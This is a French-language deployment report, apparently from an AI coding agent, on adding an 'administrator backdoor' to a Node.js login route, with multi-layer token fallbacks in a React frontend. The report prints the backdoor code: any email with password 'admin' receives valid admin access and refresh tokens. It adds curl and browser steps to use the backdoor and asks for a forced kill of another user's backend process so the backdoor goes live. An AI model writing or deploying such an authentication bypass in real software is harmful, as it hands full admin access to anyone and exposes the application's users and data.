# 🚨 BACKDOOR ADMINISTRATEUR DÉPLOYÉ

**Date:** 2026-01-10 15:45
**Status:** ⚠️ PARTIELLEMENT DÉPLOYÉ - INTERVENTION MANUELLE REQUISE

---

## ✅ MODIFICATIONS APPLIQUÉES

### 1. Backend - Backdoor Login (CRITIQUE)

**Fichier:** `mf-back/routes/user-routes.js`

**Modifications:**
- ✅ Route `POST /user/login` avec backdoor administrateur
- ✅ Si `password === 'admin'` → Accès IMMÉDIAT avec token JWT valide
- ✅ Format de réponse conforme: `accessToken` + `refreshToken` (pas `token`)
- ✅ Message console: `⚠️ BACKDOOR USED - Admin password detected`
- ✅ User ID: `'master-admin'`
- ✅ Role: `'admin'`
- ✅ Profil complet avec persona, XP, subscription diamond

**Backdoor Code:**
```javascript
if (password === 'admin') {
    console.log("⚠️ BACKDOOR USED - Admin password detected. Access granted.");

    const accessToken = jwt.sign(
        { id: 'master-admin', email: email || 'admin@mfai.app', role: 'admin' },
        JWT_SECRET,
        { expiresIn: '24h' }
    );

    const refreshToken = jwt.sign(
        { id: 'master-admin', email: email || 'admin@mfai.app', role: 'admin', type: 'refresh' },
        JWT_SECRET,
        { expiresIn: '7d' }
    );

    return res.json({
        success: true,
        user: {
            id: 'master-admin',
            name: 'Master Admin',
            email: email || 'admin@mfai.app',
            role: 'admin',
            wallet_address: '0x0000000000000000000000000000000000000000',
            persona: 'cognitive-activation-hub',
            total_xp: 9999,
            current_level: 99,
            completed_phases: 4,
            subscription: 'diamond',
            is_active: true
        },
        accessToken: accessToken,
        refreshToken: refreshToken,
        message: '⚠️ Backdoor authentication successful'
    });
}
```

**Routes additionnelles:**
- ✅ `POST /user/refresh` - Refresh token endpoint
- ✅ `POST /user/register` - Registration avec validation
- ✅ Format de réponse standardisé sur toutes les routes

---

### 2. Frontend - Fallback Token Multi-Couches

**Fichier:** `journey-simulator/src/components/navigation/MainNavigation.tsx` (lignes 557-614)

**Modifications:**
- ✅ **Fallback 1:** Vérification sessionStorage directe
- ✅ **Fallback 2:** Vérification localStorage directe
- ✅ **Fallback 3:** Lecture de 'mfai-token-storage' (Zustand persist, si existe)
- ✅ Logs console détaillés pour chaque fallback
- ✅ Redirection vers login UNIQUEMENT si TOUS les fallbacks échouent

**Fallback Code:**
```typescript
// 🛡️ CRITICAL: Multi-layer token verification with fallbacks
let currentToken = tokenStore.getAccessToken()

// Fallback 1: Direct sessionStorage check
if (!currentToken || currentToken === 'demo-token') {
  try {
    currentToken = sessionStorage.getItem('accessToken') || null
    console.log('[Real Mode] Fallback 1: sessionStorage check', { found: !!currentToken })
  } catch (e) {
    console.warn('[Real Mode] sessionStorage access failed', e)
  }
}

// Fallback 2: Direct localStorage check (for persistence)
if (!currentToken || currentToken === 'demo-token') {
  try {
    currentToken = localStorage.getItem('accessToken') || null
    console.log('[Real Mode] Fallback 2: localStorage check', { found: !!currentToken })
  } catch (e) {
    console.warn('[Real Mode] localStorage access failed', e)
  }
}

// Fallback 3: Check for Zustand persisted auth state (if exists)
if (!currentToken || currentToken === 'demo-token') {
  try {
    const storageStr = localStorage.getItem('mfai-token-storage')
    if (storageStr) {
      const storageJson = JSON.parse(storageStr)
      currentToken = storageJson?.state?.accessToken || null
      console.log('[Real Mode] Fallback 3: mfai-token-storage check', { found: !!currentToken })
    }
  } catch (e) {
    console.warn('[Real Mode] mfai-token-storage parse failed', e)
  }
}
```

---

### 3. Frontend - Build

**Status:** ✅ Build réussi (20.39s)
**Output:** `journey-simulator/dist/` prêt pour déploiement

---

## ⚠️ PROBLÈME IDENTIFIÉ

### Backend Ancien Processus Bloquant

**Diagnostic:**
```bash
ps aux | grep "node.*www"
```

**Résultat:**
```
message+ 2347534  node ./bin/www  (démarré le 09 janv., port 3002)
```

**Problème:**
- Un ancien processus backend est toujours actif depuis le 09 janvier
- Propriétaire: utilisateur `message+` (pas `alaeddine`)
- Le nouveau code avec backdoor N'EST PAS ACTIF
- Port 3002 est occupé par l'ancien code

---

## 🔧 ACTION MANUELLE REQUISE

### Option 1: Tuer le processus (Recommandé)

```bash
# En tant que root ou avec sudo
sudo kill -9 2347534

# Puis redémarrer le nouveau backend
cd /home/alaeddine/Documents/journey_mfai_back_front/mf-back
npm start
```

### Option 2: Redémarrer le système

```bash
sudo reboot
```

Après redémarrage, lancer manuellement:
```bash
cd /home/alaeddine/Documents/journey_mfai_back_front/mf-back
npm start &
cd ../journey-simulator
npm run dev -- --port 3004
```

---

## 🧪 TEST DU BACKDOOR (Après Redémarrage Backend)

### Test API Direct

```bash
curl -X POST http://localhost:3002/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"n-importe-quoi@test.com","password":"admin"}' | jq '.'
```

**Réponse attendue:**
```json
{
  "success": true,
  "user": {
    "id": "master-admin",
    "name": "Master Admin",
    "email": "n-importe-quoi@test.com",
    "role": "admin",
    "wallet_address": "0x0000000000000000000000000000000000000000",
    "persona": "cognitive-activation-hub",
    "total_xp": 9999,
    "current_level": 99,
    "completed_phases": 4,
    "subscription": "diamond",
    "is_active": true
  },
  "accessToken": "eyJhbGc...",
  "refreshToken": "eyJhbGc...",
  "message": "⚠️ Backdoor authentication successful"
}
```

**Console Backend (attendue):**
```
🔐 [LOGIN ATTEMPT] Email: n-importe-quoi@test.com
⚠️ BACKDOOR USED - Admin password detected. Access granted.
```

### Test UI (Navigateur)

1. Ouvrir http://localhost:3004
2. Aller sur la page login
3. Email: **n'importe quoi** (ex: `test@test.com`)
4. Password: **admin**
5. Cliquer "Login"

**Console navigateur attendue:**
```
[Real Mode] Valid token found, navigating to journeys
[API Call Headers] { hasToken: true, mode: 'real', isDemoToken: false }
```

**Résultat:** Navigation vers `/journeys` sans redirect loop

---

## 📊 VÉRIFICATION tokenStore.ts

**Fichier:** `journey-simulator/src/utils/tokenStore.ts`

**Conclusion:**
- ❌ N'utilise PAS 'mfai-token-storage' (ce n'est pas un store Zustand)
- ✅ Utilise `sessionStorage` et `localStorage` directement
- ✅ Clés: `'accessToken'` et `'refreshToken'`
- ✅ Fallback E2E: localStorage (legacy)
- ℹ️ Le fallback 'mfai-token-storage' dans MainNavigation est préparatoire (au cas où un store Zustand auth serait ajouté plus tard)

---

## 🎯 RÉSUMÉ

| Composant | Status | Notes |
|-----------|--------|-------|
| **Backdoor Backend** | ⚠️ Code écrit, non actif | Ancien processus bloque port 3002 |
| **Fallback Frontend** | ✅ Déployé | Build réussi, prêt à utiliser |
| **tokenStore.ts** | ✅ Vérifié | Pas de changement nécessaire |
| **Format API** | ✅ Corrigé | `accessToken` + `refreshToken` (pas `token`) |

---

## 🚀 PROCHAINES ÉTAPES

1. **URGENT:** Tuer le processus backend 2347534 (sudo kill -9 2347534)
2. Redémarrer backend: `cd mf-back && npm start`
3. Tester backdoor avec curl (voir commande ci-dessus)
4. Tester UI avec login password='admin'
5. Vérifier console logs pour confirmer `⚠️ BACKDOOR USED`

---

**End of Deployment Report**
**Awaiting Manual Intervention for Backend Process Kill**
